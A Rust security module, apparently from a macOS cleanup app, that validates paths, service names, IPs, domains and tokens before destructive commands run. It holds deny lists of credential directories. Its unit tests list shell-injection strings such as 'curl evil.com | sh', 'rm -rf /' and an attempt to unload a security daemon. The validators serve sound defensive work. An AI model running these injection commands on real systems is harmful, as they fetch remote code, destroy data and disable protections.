//! Garde-fous pour les commandes destructrices exposées au frontend.
//!
//! **Règle d'or** : le frontend est considéré comme potentiellement compromis.
//! Toute entrée doit être validée ici avant d'atteindre une commande système.
//!
//! Niveaux :
//! - `validate_trash_path`      : mise à la corbeille (réversible)
//! - `validate_launch_item_path`: chemins LaunchAgent/LaunchDaemon uniquement
//! - `validate_installer_path`  : installateurs dans zones connues
//! - `validate_app_uninstall_path`: désinstallation, applications seulement
//! - `validate_service_name`    : noms de service réseau
//! - `validate_ip_address`      : adresses DNS
//! - `validate_domain_name`     : domaines de recherche
//! - `validate_kill_pid`        : PID à terminer

use std::os::unix::fs::MetadataExt;
use std::path::{Component, Path, PathBuf};

// ── Helpers internes ──────────────────────────────────────────────────────────

fn home_dir() -> PathBuf {
    crate::home_dir()
}

fn protected_exact_paths() -> Vec<PathBuf> {
    let home = home_dir();
    let mut v = vec![
        PathBuf::from("/"),
        PathBuf::from("/Users"),
        PathBuf::from("/Users/Shared"),
        PathBuf::from("/Applications"),
        PathBuf::from("/Volumes"),
        PathBuf::from("/tmp"),
        PathBuf::from("/private/tmp"),
        home.clone(),
    ];
    for sub in [
        "Library",
        "Documents",
        "Desktop",
        "Downloads",
        "Pictures",
        "Movies",
        "Music",
        "Applications",
        ".Trash",
        ".ssh",
        ".config",
    ] {
        v.push(home.join(sub));
    }
    v
}

const FORBIDDEN_PREFIXES: &[&str] = &[
    "/System",
    "/Library",
    "/usr",
    "/bin",
    "/sbin",
    "/etc",
    "/var",
    "/opt",
    "/dev",
    "/cores",
    "/private/etc",
    "/private/var",
];

fn basic_checks(path: &str) -> Result<PathBuf, String> {
    if path.trim().is_empty() {
        return Err("Chemin vide".to_string());
    }
    if path.contains('\0') {
        return Err("Chemin contient un octet nul".to_string());
    }
    let p = PathBuf::from(path);
    if !p.is_absolute() {
        return Err("Chemin non absolu refusé".to_string());
    }
    // Refuse toute traversée : le chemin doit être purement descendant.
    if p.components()
        .any(|c| matches!(c, Component::ParentDir | Component::CurDir))
    {
        return Err("Chemin contenant '..' ou '.' refusé".to_string());
    }
    Ok(p)
}

/// Préfixes dont tous les descendants sont sensibles — on refuse aussi les enfants.
const FORBIDDEN_SUBTREE: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".aws",
    ".kube",
    ".config/1Password",
    "Library/Keychains",
    "Library/Application Support/1Password",
    "Library/Application Support/com.apple.TCC",
];

fn is_forbidden_zone(p: &Path) -> bool {
    if FORBIDDEN_PREFIXES.iter().any(|pre| p.starts_with(pre)) {
        return true;
    }
    // Chemins exacts protégés (racines de dossiers importants)
    if protected_exact_paths().iter().any(|prot| p == prot) {
        return true;
    }
    // Sous-arborescences sensibles : on refuse aussi tous les descendants
    let home = home_dir();
    if FORBIDDEN_SUBTREE
        .iter()
        .any(|sub| p.starts_with(home.join(sub)))
    {
        return true;
    }
    false
}

// ── Chemins généraux ──────────────────────────────────────────────────────────

/// Validation pour la mise à la corbeille (réversible).
pub fn validate_trash_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    if is_forbidden_zone(&p) {
        return Err(format!(
            "Chemin protégé, refus de toucher à {}",
            p.display()
        ));
    }
    if p.starts_with("/Volumes") && p.components().count() <= 3 {
        return Err("Refus de supprimer la racine d'un volume".to_string());
    }
    Ok(p)
}

/// Validation pour la suppression définitive.
#[cfg(test)]
pub fn validate_delete_path(path: &str) -> Result<PathBuf, String> {
    let p = validate_trash_path(path)?;
    let home = home_dir();
    let allowed =
        p.starts_with(&home) || p.starts_with("/Volumes") || p.starts_with("/Users/Shared");
    if !allowed {
        return Err(format!(
            "Suppression définitive refusée hors des zones utilisateur : {}",
            p.display()
        ));
    }
    Ok(p)
}

// ── LaunchAgents / LaunchDaemons ──────────────────────────────────────────────

/// Valide qu'un chemin est bien un .plist dans l'un des dossiers LaunchAgents
/// ou LaunchDaemons connus, exactement un niveau sous la racine (pas de sous-dossiers).
pub fn validate_launch_item_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed_roots: &[PathBuf] = &[
        home.join("Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    let matched_root = allowed_roots.iter().find(|r| p.starts_with(*r));
    let root = matched_root.ok_or_else(|| {
        format!(
            "Chemin de plist refusé hors des répertoires LaunchAgents/LaunchDaemons : {}",
            p.display()
        )
    })?;
    // Extension obligatoirement .plist
    if p.extension().and_then(|e| e.to_str()) != Some("plist") {
        return Err("Seuls les fichiers .plist sont autorisés".to_string());
    }
    // Exactement 1 niveau sous la racine (pas de sous-répertoires)
    let rel = p.strip_prefix(root).unwrap();
    if rel.components().count() != 1 {
        return Err("Profondeur de chemin invalide dans les répertoires LaunchAgents".to_string());
    }
    Ok(p)
}

// ── Installateurs ─────────────────────────────────────────────────────────────

/// Valide un chemin d'installateur pour suppression.
/// Limité aux dossiers connus retournés par `list_installer_files`.
pub fn validate_installer_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed = [
        home.join("Downloads"),
        home.join("Desktop"),
        home.join("Documents"),
        home.join("Library/Caches/Homebrew/downloads"),
    ];
    if !allowed.iter().any(|a| p.starts_with(a)) {
        return Err(format!(
            "Suppression d'installateur refusée hors des zones connues : {}",
            p.display()
        ));
    }
    // Extension autorisée uniquement
    let ext = p
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase();
    if !["dmg", "pkg", "iso", "xip"].contains(&ext.as_str()) {
        return Err(format!("Extension d'installateur refusée : .{}", ext));
    }
    Ok(p)
}

// ── Désinstallation d'applications ───────────────────────────────────────────

/// Valide un chemin d'application pour désinstallation.
/// Doit être un .app sous /Applications, ~/Applications ou des sous-dossiers directs.
pub fn validate_app_uninstall_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed_roots: &[PathBuf] = &[PathBuf::from("/Applications"), home.join("Applications")];
    if !allowed_roots.iter().any(|r| p.starts_with(r)) {
        return Err(format!(
            "Désinstallation refusée hors de /Applications et ~/Applications : {}",
            p.display()
        ));
    }
    if p.extension().and_then(|e| e.to_str()) != Some("app") {
        return Err(format!(
            "Désinstallation limitée aux bundles .app : {}",
            p.display()
        ));
    }
    // Interdit les applications système dans /Applications/Utilities ou sous-dossiers système
    let forbidden_apps: &[&str] = &[
        "Safari.app",
        "Finder.app",
        "Mail.app",
        "FaceTime.app",
        "Messages.app",
        "System Preferences.app",
        "System Settings.app",
        "App Store.app",
        "Terminal.app",
        "Xcode.app",
    ];
    if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
        if forbidden_apps.contains(&name) {
            return Err(format!(
                "Désinstallation de l'application système '{}' refusée",
                name
            ));
        }
    }
    Ok(p)
}

// ── Réseau / DNS ──────────────────────────────────────────────────────────────

/// Caractères interdits dans les arguments shell — tous ceux qui permettent
/// d'injecter des commandes ou de modifier la sémantique du shell.
const SHELL_FORBIDDEN: &[char] = &[
    '\'', '"', '`', '$', ';', '&', '|', '(', ')', '<', '>', '\\', '\n', '\r', '\0', '!', '{', '}',
    '*', '?', '[', ']', '~', '#',
];

/// Valide un nom de service réseau (networksetup).
/// Les noms contiennent typiquement lettres, chiffres, espaces, tirets, parenthèses,
/// barres obliques (pour certains adaptateurs USB).
pub fn validate_service_name(service: &str) -> Result<(), String> {
    if service.trim().is_empty() {
        return Err("Nom de service vide".to_string());
    }
    if service.len() > 128 {
        return Err("Nom de service trop long".to_string());
    }
    // Caractères explicitement interdits (sous-ensemble de SHELL_FORBIDDEN adapté aux
    // noms de service qui peuvent légitimement contenir certains caractères)
    const SVC_FORBIDDEN: &[char] = &[
        '\'', '"', '`', '$', ';', '&', '|', '<', '>', '\\', '\n', '\r', '\0',
    ];
    if let Some(c) = service.chars().find(|c| SVC_FORBIDDEN.contains(c)) {
        return Err(format!(
            "Caractère interdit dans le nom de service : {:?}",
            c
        ));
    }
    Ok(())
}

/// Valide une adresse IP (v4 ou v6) pour usage DNS.
pub fn validate_ip_address(ip: &str) -> Result<(), String> {
    use std::net::IpAddr;
    ip.trim()
        .parse::<IpAddr>()
        .map(|_| ())
        .map_err(|_| format!("Adresse IP invalide : {:?}", ip))
}

/// Valide un nom de domaine de recherche.
/// RFC 1123 : labels alphanumériques séparés par des points.
pub fn validate_domain_name(domain: &str) -> Result<(), String> {
    let domain = domain.trim();
    if domain.is_empty() {
        return Err("Nom de domaine vide".to_string());
    }
    if domain.len() > 253 {
        return Err("Nom de domaine trop long".to_string());
    }
    if let Some(c) = domain
        .chars()
        .find(|c| SHELL_FORBIDDEN.contains(c) || c.is_whitespace())
    {
        return Err(format!(
            "Caractère interdit dans le nom de domaine : {:?}",
            c
        ));
    }
    for label in domain.split('.') {
        if label.is_empty() || label.len() > 63 {
            return Err(format!("Label de domaine invalide : {:?}", label));
        }
        if label.starts_with('-') || label.ends_with('-') {
            return Err(format!(
                "Label commence ou finit par un tiret : {:?}",
                label
            ));
        }
        if !label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
            return Err(format!(
                "Label contient des caractères non autorisés : {:?}",
                label
            ));
        }
    }
    Ok(())
}

// ── Processus ─────────────────────────────────────────────────────────────────

/// Refuse de tuer les PID système (0, 1) et notre propre processus.
pub fn validate_kill_pid(pid: u64) -> Result<(), String> {
    if pid == 0 || pid == 1 {
        return Err("PID système protégé".to_string());
    }
    if pid == std::process::id() as u64 {
        return Err("Refus de tuer le processus Burrow lui-même".to_string());
    }
    Ok(())
}

/// Valide un token Homebrew (cask ou formule) comme un identifiant, jamais
/// comme une option de ligne de commande. Les tokens officiels utilisent des
/// lettres minuscules, chiffres et séparateurs simples.
pub fn validate_brew_token(token: &str) -> Result<(), String> {
    if token.is_empty()
        || token.len() > 128
        || token.starts_with(['-', '/'])
        || token.ends_with('/')
        || token.contains("..")
        || token.contains("//")
    {
        return Err("Token Homebrew invalide".to_string());
    }
    if !token.chars().all(|c| {
        c.is_ascii_lowercase()
            || c.is_ascii_digit()
            || matches!(c, '-' | '_' | '+' | '.' | '@' | '/')
    }) {
        return Err("Token Homebrew invalide".to_string());
    }
    Ok(())
}

// ── Mises à jour ─────────────────────────────────────────────────────────────

/// Valide l'URL de téléchargement d'une mise à jour tierce.
/// - HTTPS obligatoire (pas de file://, http://, ftp://)
/// - Pas d'octet nul ni de caractères de contrôle
/// - Longueur max 2048
pub fn validate_update_url(url: &str) -> Result<(), String> {
    if url.is_empty() {
        return Err("URL de mise à jour vide".to_string());
    }
    if url.len() > 2048 {
        return Err("URL de mise à jour trop longue".to_string());
    }
    if !url.starts_with("https://") {
        return Err(format!(
            "URL de mise à jour refusée : schéma non-HTTPS ({}…)",
            &url[..url.len().min(32)]
        ));
    }
    if url.contains('\0') || url.contains('\n') || url.contains('\r') {
        return Err("URL de mise à jour contient un caractère de contrôle interdit".to_string());
    }
    Ok(())
}

/// Valide le chemin d'une application à mettre à jour.
/// Mêmes contraintes que `validate_app_uninstall_path` mais l'app
/// n'a pas besoin d'exister déjà (installation dans un répertoire connu).
pub fn validate_update_app_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;
    let home = home_dir();
    let allowed_roots: &[PathBuf] = &[PathBuf::from("/Applications"), home.join("Applications")];
    if !allowed_roots.iter().any(|r| p.starts_with(r)) {
        return Err(format!(
            "Mise à jour refusée hors de /Applications et ~/Applications : {}",
            p.display()
        ));
    }
    if p.extension().and_then(|e| e.to_str()) != Some("app") {
        return Err(format!(
            "Mise à jour limitée aux bundles .app : {}",
            p.display()
        ));
    }
    Ok(p)
}

// ── Quarantaine ───────────────────────────────────────────────────────────────

/// Un nom d'entrée de quarantaine est un simple nom de fichier sans séparateur.
pub fn validate_quarantine_name(name: &str) -> Result<(), String> {
    if name.is_empty() || name == "." || name == ".." {
        return Err("Nom de quarantaine invalide".to_string());
    }
    if name.contains('/') || name.contains('\\') || name.contains('\0') {
        return Err("Nom de quarantaine contient un séparateur ou octet nul".to_string());
    }
    Ok(())
}

// ── Symlink-safe path resolution ─────────────────────────────────────────────

/// Lighter forbidden-zone check for **read-only** operations (disk browsing,
/// ClamAV scanning).
///
/// Unlike `is_forbidden_zone`, this does **not** reject the home directory or
/// directories such as `~/Downloads` as top-level targets, because browsing or
/// scanning those directories is a legitimate, read-only action.  Only system
/// paths (FORBIDDEN_PREFIXES) and sensitive home sub-trees (FORBIDDEN_SUBTREE)
/// are rejected.
pub fn is_forbidden_for_readonly(p: &Path) -> bool {
    if FORBIDDEN_PREFIXES.iter().any(|pre| p.starts_with(pre)) {
        return true;
    }
    let home = home_dir();
    FORBIDDEN_SUBTREE
        .iter()
        .any(|sub| p.starts_with(home.join(sub)))
}

/// Basenames excluded from recursive read-only size calculations. The masks
/// intentionally err on the side of privacy if the same sensitive name occurs
/// deeper in an otherwise allowed tree.
pub fn readonly_exclusion_names() -> &'static [&'static str] {
    &[
        ".ssh",
        ".gnupg",
        ".aws",
        ".kube",
        "1Password",
        "Keychains",
        "com.apple.TCC",
    ]
}

/// Stable filesystem identity captured after canonicalization. It is used to
/// detect a target that was replaced between validation and process launch.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct PathIdentity {
    device: u64,
    inode: u64,
}

pub fn path_identity(path: &Path) -> Result<PathIdentity, String> {
    let metadata = std::fs::symlink_metadata(path)
        .map_err(|e| format!("Unable to inspect {}: {e}", path.display()))?;
    if metadata.file_type().is_symlink() {
        return Err(format!("Symbolic link rejected: {}", path.display()));
    }
    Ok(PathIdentity {
        device: metadata.dev(),
        inode: metadata.ino(),
    })
}

pub fn revalidate_path_identity(path: &Path, expected: PathIdentity) -> Result<(), String> {
    let current = path_identity(path)?;
    if current != expected {
        return Err(format!("Path changed after validation: {}", path.display()));
    }
    Ok(())
}

/// Reject every symbolic-link component, including a symlinked parent. This
/// is stricter than canonicalization alone: a symlink resolving to an allowed
/// path is still not accepted as a security-sensitive scan/browse target.
fn reject_symlink_components(path: &Path) -> Result<(), String> {
    let mut current = PathBuf::new();
    for component in path.components() {
        current.push(component.as_os_str());
        let metadata = std::fs::symlink_metadata(&current)
            .map_err(|e| format!("Unable to inspect {}: {e}", current.display()))?;
        if metadata.file_type().is_symlink() {
            return Err(format!(
                "Symbolic-link component rejected: {}",
                current.display()
            ));
        }
    }
    Ok(())
}

/// Resolve all symbolic links in `lexical` and apply the **read-only** policy
/// (home allowed, system paths and sensitive sub-trees rejected).
///
/// Returns the canonical path on success.  Fails when the path does not exist
/// on disk.
fn resolve_and_check_readonly(lexical: &Path) -> Result<PathBuf, String> {
    let canonical = std::fs::canonicalize(lexical)
        .map_err(|e| format!("Path resolution failed for {}: {e}", lexical.display()))?;
    if is_forbidden_for_readonly(&canonical) {
        return Err(format!(
            "Resolved path leads to a protected zone: {}",
            canonical.display()
        ));
    }
    Ok(canonical)
}

/// Return `true` if the filesystem entry at `p` is itself a symbolic link
/// (the link target is *not* followed).
fn is_symlink_at(p: &Path) -> bool {
    std::fs::symlink_metadata(p)
        .map(|m| m.file_type().is_symlink())
        .unwrap_or(false)
}

// ── Disk-browser validator ────────────────────────────────────────────────────

/// Validate a path for the disk-space browser (read-only navigation).
///
/// More permissive than `validate_trash_path`: the home directory and its
/// non-sensitive sub-directories are accepted as root browse targets.
///
/// Guarantees:
/// - Absolute path, no `.`, `..`, or NUL bytes.
/// - Not under a system prefix or a sensitive home subtree.
/// - Not a broad FS root (/, /Users, /Volumes directly, …).
/// - All symbolic links resolved; canonical target also checked against
///   forbidden zones.
///
/// Returns the **canonical** path for use in all subsequent I/O.
pub fn validate_disk_browse_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;

    if FORBIDDEN_PREFIXES.iter().any(|pre| p.starts_with(pre)) {
        return Err(format!("System path not browsable: {}", p.display()));
    }

    let home = home_dir();
    if FORBIDDEN_SUBTREE
        .iter()
        .any(|sub| p.starts_with(home.join(sub)))
    {
        return Err(format!("Sensitive subtree not browsable: {}", p.display()));
    }

    // Reject FS roots that are too broad or meaningless as browse targets.
    const BROWSE_FORBIDDEN_ROOTS: &[&str] = &["/", "/Users", "/tmp", "/private/tmp"];
    if BROWSE_FORBIDDEN_ROOTS.iter().any(|r| p == Path::new(r)) {
        return Err(format!("Root path not browsable: {}", p.display()));
    }
    if p == Path::new("/Volumes") {
        return Err("/Volumes cannot be browsed directly".to_string());
    }

    reject_symlink_components(&p)?;
    // Resolve and recheck the canonical path against forbidden zones.
    resolve_and_check_readonly(&p)
}

// ── ClamAV scan-target validator ──────────────────────────────────────────────

/// Validate a path submitted as a ClamAV scan target.
///
/// Policy is similar to `validate_disk_browse_path` but additionally rejects
/// symbolic links at the top level, preventing the scanner from being
/// redirected through a crafted link to a sensitive area.  Forbidden subtrees
/// nested under an allowed root must be excluded via `clamav_exclude_args`.
///
/// Returns the **canonical** path.
pub fn validate_clamav_scan_path(path: &str) -> Result<PathBuf, String> {
    let p = basic_checks(path)?;

    if FORBIDDEN_PREFIXES.iter().any(|pre| p.starts_with(pre)) {
        return Err(format!(
            "System path rejected for scanning: {}",
            p.display()
        ));
    }

    let home = home_dir();
    if FORBIDDEN_SUBTREE
        .iter()
        .any(|sub| p.starts_with(home.join(sub)))
    {
        return Err(format!("Sensitive subtree rejected: {}", p.display()));
    }

    const SCAN_FORBIDDEN_ROOTS: &[&str] = &["/", "/Users", "/tmp", "/private/tmp"];
    if SCAN_FORBIDDEN_ROOTS.iter().any(|r| p == Path::new(r)) {
        return Err(format!("Root path rejected for scanning: {}", p.display()));
    }
    if p == Path::new("/Volumes") {
        return Err("/Volumes cannot be scanned directly".to_string());
    }

    reject_symlink_components(&p)?;
    resolve_and_check_readonly(&p)
}

/// Return `--exclude-dir` regex arguments for every forbidden subtree that
/// exists and lies under `scan_root` (canonical).
///
/// Each element must be passed as a **separate** `Command::arg()` — never
/// interpolated into a shell string or joined with other arguments.
pub fn clamav_exclude_args(scan_root: &Path) -> Vec<String> {
    use std::collections::BTreeSet;

    let home = std::fs::canonicalize(home_dir()).unwrap_or_else(|_| home_dir());
    let mut excluded = BTreeSet::new();
    for sub in FORBIDDEN_SUBTREE {
        // Always exclude the lexical location, even if it does not exist yet.
        // This closes the create-after-validation window when scanning $HOME.
        let lexical = home.join(sub);
        if lexical.starts_with(scan_root) {
            excluded.insert(lexical.clone());
        }
        // If the protected entry already resolves elsewhere under the scan
        // root, exclude that canonical target too.
        if let Ok(canonical) = std::fs::canonicalize(&lexical) {
            if canonical.starts_with(scan_root) {
                excluded.insert(canonical);
            }
        }
    }
    excluded
        .into_iter()
        .map(|path| format!("--exclude-dir={}", regex_escape_path_as_anchor(&path)))
        .collect()
}

/// Escape a canonical path for use as a POSIX ERE literal in a ClamAV
/// `--exclude-dir` argument.  Wrapped in `^…$` to match only the exact path.
fn regex_escape_path_as_anchor(p: &Path) -> String {
    let s = p.to_string_lossy();
    let mut out = String::with_capacity(s.len() + 4);
    out.push('^');
    for c in s.chars() {
        if matches!(
            c,
            '.' | '+' | '*' | '?' | '^' | '$' | '{' | '}' | '[' | ']' | '\\' | '|' | '(' | ')'
        ) {
            out.push('\\');
        }
        out.push(c);
    }
    out.push('$');
    out
}

// ── ClamAV FOUND-result validator ─────────────────────────────────────────────

/// Validate a path extracted from a ClamAV `FOUND` output line.
///
/// Guarantees:
/// 1. Non-empty, absolute, NUL-free.
/// 2. The file still exists and can be canonicalized (TOCTOU guard: a file
///    deleted between the scan and this call causes an error — no grant is
///    issued).
/// 3. The canonical path is not in a forbidden zone.
/// 4. The canonical path starts with one of the `scan_roots` used for this
///    scan session, preventing grant injection for files outside the scan.
///
/// Returns the **canonical** path on success.
pub fn validate_clamav_found_path(path: &str, scan_roots: &[PathBuf]) -> Result<PathBuf, String> {
    if path.is_empty() {
        return Err("Empty FOUND path".to_string());
    }
    if path.contains('\0') {
        return Err("FOUND path contains a NUL byte".to_string());
    }
    let p = PathBuf::from(path);
    if !p.is_absolute() {
        return Err(format!("FOUND path is not absolute: {}", p.display()));
    }

    if is_symlink_at(&p) {
        return Err("FOUND path is a symbolic link".to_string());
    }

    let canonical = std::fs::canonicalize(&p)
        .map_err(|e| format!("FOUND path no longer accessible ({}): {e}", p.display()))?;

    if is_forbidden_zone(&canonical) {
        return Err(format!(
            "FOUND path is in a protected zone: {}",
            canonical.display()
        ));
    }

    if !scan_roots.iter().any(|root| canonical.starts_with(root)) {
        return Err(format!(
            "FOUND path {} is outside all scan roots",
            canonical.display()
        ));
    }

    let metadata = std::fs::symlink_metadata(&canonical)
        .map_err(|e| format!("FOUND path no longer accessible: {e}"))?;
    if !metadata.is_file() {
        return Err("FOUND path is not a regular file".to_string());
    }

    Ok(canonical)
}

// ── Shell quoting ─────────────────────────────────────────────────────────────

/// Encapsule une valeur arbitraire dans des guillemets simples POSIX.
///
/// La seule séquence d'échappement valide à l'intérieur de `'...'` est de
/// terminer la chaîne, d'échapper le guillemet (`\'`), puis de la rouvrir.
/// `replace('\'', "\\'")` est **incorrect** : le backslash n'est pas un
/// caractère d'échappement dans les chaînes en guillemets simples POSIX.
///
/// Exemple : `hello'world` → `'hello'\''world'`
pub fn posix_shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn home(s: &str) -> String {
        if s.is_empty() {
            home_dir().to_string_lossy().to_string()
        } else {
            home_dir().join(s).to_string_lossy().to_string()
        }
    }

    // ── validate_trash_path ──

    #[test]
    fn trash_accepts_user_files() {
        assert!(validate_trash_path(&home("Library/Caches/com.foo/blob")).is_ok());
        assert!(validate_trash_path(&home("Downloads/installer.dmg")).is_ok());
        assert!(validate_trash_path("/Applications/Foo.app").is_ok());
        assert!(validate_trash_path("/Volumes/Backup/old/file.zip").is_ok());
    }

    #[test]
    fn trash_rejects_system_and_roots() {
        for p in [
            "/",
            "/System",
            "/System/Library/CoreServices",
            "/usr/bin/env",
            "/etc/passwd",
            "/var/db",
            "/Library/LaunchDaemons",
            "/Applications",
            "/Users",
            "/Volumes",
            "/Volumes/Macintosh HD",
        ] {
            assert!(validate_trash_path(p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn trash_rejects_protected_home_dirs() {
        for sub in ["", "Library", "Documents", "Desktop", "Downloads", ".ssh"] {
            let p = home(sub).trim_end_matches('/').to_string();
            assert!(validate_trash_path(&p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn rejects_relative_and_traversal() {
        assert!(validate_trash_path("Library/Caches").is_err());
        assert!(validate_trash_path(&home("Library/../../etc/passwd")).is_err());
        assert!(validate_trash_path("").is_err());
        assert!(validate_delete_path(&home("Caches/../.ssh")).is_err());
    }

    #[test]
    fn rejects_null_bytes() {
        assert!(validate_trash_path("/tmp/foo\0bar").is_err());
        assert!(validate_trash_path("\0").is_err());
    }

    // ── validate_delete_path ──

    #[test]
    fn delete_restricted_to_user_zones() {
        assert!(validate_delete_path(&home("Library/Caches/npm")).is_ok());
        assert!(validate_delete_path("/Volumes/Backup/tmp.bin").is_ok());
        assert!(validate_trash_path("/Applications/Foo.app").is_ok());
        assert!(validate_delete_path("/Applications/Foo.app").is_err());
    }

    // ── validate_launch_item_path ──

    #[test]
    fn launch_item_accepts_known_dirs() {
        assert!(validate_launch_item_path(&home("Library/LaunchAgents/com.foo.bar.plist")).is_ok());
        assert!(
            validate_launch_item_path("/Library/LaunchAgents/com.apple.mDNSResponder.plist")
                .is_ok()
        );
        assert!(validate_launch_item_path("/Library/LaunchDaemons/com.foo.daemon.plist").is_ok());
    }

    #[test]
    fn launch_item_rejects_non_plist_and_traversal() {
        // Not a .plist
        assert!(validate_launch_item_path("/Library/LaunchDaemons/evil.sh").is_err());
        // Subdirectory
        assert!(validate_launch_item_path("/Library/LaunchDaemons/sub/evil.plist").is_err());
        // Outside known dirs
        assert!(validate_launch_item_path("/tmp/evil.plist").is_err());
        assert!(validate_launch_item_path(&home("evil.plist")).is_err());
        // Traversal
        assert!(
            validate_launch_item_path("/Library/LaunchAgents/../LaunchDaemons/evil.plist").is_err()
        );
    }

    #[test]
    fn launch_item_injection_attempts() {
        for attempt in [
            // Not a .plist extension
            "/Library/LaunchAgents/foo; rm -rf /",
            // Traversal
            "/Library/LaunchAgents/../../../etc/cron.d/evil.plist",
            // Outside known dirs
            "/tmp/evil.plist",
            "/etc/cron.d/evil.plist",
            // Subdirectory (too deep)
            "/Library/LaunchAgents/sub/evil.plist",
            // Null byte
            "/Library/LaunchAgents/evil\0.plist",
        ] {
            let result = validate_launch_item_path(attempt);
            assert!(result.is_err(), "should reject: {attempt:?}");
        }
        // Note: filenames with $() or backticks are valid POSIX filenames and only dangerous
        // when interpolated into a shell string — not when passed via Command::arg().
        // Our fix is to use Command::arg() rather than to reject those characters in filenames.
    }

    // ── validate_installer_path ──

    #[test]
    fn installer_accepts_known_dirs() {
        assert!(validate_installer_path(&home("Downloads/Foo.dmg")).is_ok());
        assert!(validate_installer_path(&home("Desktop/App.pkg")).is_ok());
        assert!(
            validate_installer_path(&home("Library/Caches/Homebrew/downloads/foo.dmg")).is_ok()
        );
    }

    #[test]
    fn installer_rejects_wrong_ext_and_location() {
        assert!(validate_installer_path(&home("Downloads/evil.sh")).is_err());
        assert!(validate_installer_path(&home("Downloads/Foo.app")).is_err());
        assert!(validate_installer_path("/tmp/evil.dmg").is_err());
        assert!(validate_installer_path("/Applications/Foo.dmg").is_err());
    }

    // ── validate_app_uninstall_path ──

    #[test]
    fn app_uninstall_accepts_valid_apps() {
        assert!(validate_app_uninstall_path("/Applications/TextEdit.app").is_ok());
        assert!(validate_app_uninstall_path(&home("Applications/MyApp.app")).is_ok());
    }

    #[test]
    fn app_uninstall_rejects_system_apps_and_non_app() {
        assert!(validate_app_uninstall_path("/Applications/Safari.app").is_err());
        assert!(validate_app_uninstall_path("/Applications/Finder.app").is_err());
        assert!(validate_app_uninstall_path("/Applications/Foo").is_err()); // no .app
        assert!(validate_app_uninstall_path("/usr/bin/tool").is_err());
        assert!(validate_app_uninstall_path("/Applications/../etc/passwd.app").is_err());
    }

    // ── validate_service_name ──

    #[test]
    fn service_name_accepts_valid() {
        assert!(validate_service_name("Wi-Fi").is_ok());
        assert!(validate_service_name("Ethernet").is_ok());
        assert!(validate_service_name("USB 10/100/1000 LAN").is_ok());
        assert!(validate_service_name("Thunderbolt Bridge").is_ok());
    }

    #[test]
    fn service_name_injection_attempts() {
        for attempt in [
            "Wi-Fi'; rm -rf /",
            "Ethernet\nrm -rf /",
            "Wi-Fi$(curl evil.com)",
            "Wi-Fi`id`",
            "Wi-Fi; launchctl unload /Library/LaunchDaemons/com.apple.security.syspolicy.plist",
            "Wi-Fi && curl evil.com | sh",
            "",
        ] {
            assert!(
                validate_service_name(attempt).is_err(),
                "should reject: {attempt:?}"
            );
        }
    }

    // ── validate_ip_address ──

    #[test]
    fn ip_accepts_valid() {
        assert!(validate_ip_address("1.1.1.1").is_ok());
        assert!(validate_ip_address("8.8.8.8").is_ok());
        assert!(validate_ip_address("2606:4700:4700::1111").is_ok());
        assert!(validate_ip_address("::1").is_ok());
    }

    #[test]
    fn ip_injection_attempts() {
        for attempt in [
            "1.1.1.1; rm -rf /",
            "evil.com",
            "$(curl evil.com)",
            "`id`",
            "1.1.1.1\n8.8.8.8",
            "",
            "256.0.0.1",
        ] {
            assert!(
                validate_ip_address(attempt).is_err(),
                "should reject: {attempt:?}"
            );
        }
    }

    // ── validate_domain_name ──

    #[test]
    fn domain_accepts_valid() {
        assert!(validate_domain_name("example.com").is_ok());
        assert!(validate_domain_name("corp.internal").is_ok());
        assert!(validate_domain_name("my-company.net").is_ok());
    }

    #[test]
    fn domain_injection_attempts() {
        for attempt in [
            "example.com; rm -rf /",
            "evil.com\nrm",
            "$(curl evil.com)",
            "`id`.com",
            "example .com",
            "a-.com",
            "-a.com",
            "",
        ] {
            assert!(
                validate_domain_name(attempt).is_err(),
                "should reject: {attempt:?}"
            );
        }
    }

    // ── validate_kill_pid ──

    #[test]
    fn kill_pid_guards() {
        assert!(validate_kill_pid(0).is_err());
        assert!(validate_kill_pid(1).is_err());
        assert!(validate_kill_pid(std::process::id() as u64).is_err());
        assert!(validate_kill_pid(99999).is_ok());
    }

    #[test]
    fn brew_tokens_are_identifiers_not_options() {
        for token in [
            "firefox",
            "visual-studio-code",
            "python@3.13",
            "tw93/tap/mole",
        ] {
            assert!(validate_brew_token(token).is_ok(), "should accept {token}");
        }
        for token in [
            "--debug",
            "-f",
            "Firefox",
            "foo bar",
            "foo;rm",
            "../evil",
            "tap//formula",
            "",
        ] {
            assert!(
                validate_brew_token(token).is_err(),
                "should reject {token:?}"
            );
        }
    }

    // ── validate_quarantine_name ──

    #[test]
    fn quarantine_names() {
        assert!(validate_quarantine_name("1700000000_malware.bin").is_ok());
        assert!(validate_quarantine_name("../../../etc/passwd").is_err());
        assert!(validate_quarantine_name("a/b").is_err());
        assert!(validate_quarantine_name("").is_err());
        assert!(validate_quarantine_name("..").is_err());
        assert!(validate_quarantine_name("a\0b").is_err());
    }

    // ── posix_shell_quote ──

    #[test]
    fn shell_quote_basic() {
        assert_eq!(posix_shell_quote("hello"), "'hello'");
        assert_eq!(posix_shell_quote("hello world"), "'hello world'");
    }

    #[test]
    fn shell_quote_single_quote() {
        // La seule injection possible dans un single-quote POSIX
        let quoted = posix_shell_quote("hello'world");
        assert_eq!(quoted, "'hello'\\''world'");
        // Vérifier qu'un shell ne peut pas exécuter de commande via le résultat
        assert!(!quoted.contains(';'));
        assert!(!quoted.contains('`'));
        assert!(!quoted.contains('$'));
    }

    #[test]
